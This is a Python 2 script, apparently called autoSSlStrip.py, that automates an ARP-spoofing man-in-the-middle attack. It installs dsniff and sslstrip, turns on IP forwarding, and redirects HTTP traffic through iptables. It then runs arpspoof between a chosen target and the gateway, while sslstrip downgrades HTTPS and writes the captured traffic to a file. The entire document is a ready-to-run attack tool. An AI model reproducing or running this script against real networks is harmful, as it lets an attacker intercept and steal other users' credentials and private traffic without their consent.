#!/usr/bin/python

import commands
import os
import sys
import subprocess
sys.tracebacklimit = 0

gateway = commands.getoutput('ip route show | grep default | cut -d " " -f 3')

def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', type=str, help="Target IP")
	parser.add_argument('-i', '--interface', type=str, help="Interface to use")
	parser.add_argument('-o', '--output_file', type=str, help="Output file")
	return parser.parse_args()

def bannertools():
	print "Checking tools . . ."

def checktools():
	bannertools()
	if(len(os.popen("dpkg -l | grep dsniff").read())==0):
		os.system("sudo apt-get install dsniff")
	if(len(os.popen("dpkg -l | grep sslstrip").read())==0):
		os.system("sudo apt-get install sslstrip")
	print "sslstrip " u'\u2713'
	print "dsniff   "u'\u2713'

def bannermain():
	print "																							"
	print "                        ______ ______ _        ______            _       				"
	print "               _       / _____) _____|_)      / _____) _        (_)      				"
	print " _____ _   _ _| |_ ___( (____( (____  _      ( (____ _| |_  ____ _ ____  				"
	print "(____ | | | (_   _) _ \\____\\____  \| |      \____ (_   _)/ ___) |  _ \ 				"
	print "/ ___ | |_| | | || |_| |____) )____) ) |_____ _____) )| |_| |   | | |_| |				"
	print "\_____|____/   \__)___(______(______/|_______|______/  \__)_|   |_|  __/ 				"
	print "                                                                  |_|   					"
	print "                                                                  						"

def main():
	bannermain()
	checktools()
	if not os.geteuid() == 0:
    		sys.exit('Error - must be run as root!')
	args = parse_args()
	INTERFACE = args.interface
	TARGET = args.target
	OUTPUT_FILE = args.output_file
	try:
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
		print "File saved as '" + OUTPUT_FILE + "' in working directory"
		commands.getoutput('xterm -e "arpspoof -i '+INTERFACE+' -t '+gateway+' '+TARGET+'" | xterm -e "arpspoof -i '+INTERFACE+' -t '+TARGET+' '+gateway+'" | xterm -e "sslstrip -w '+OUTPUT_FILE+' -l 8080"')
	except Exception, e:
		print "Error - check parameters!"
		print "python autoSSlStrip.py -h for help"
main()
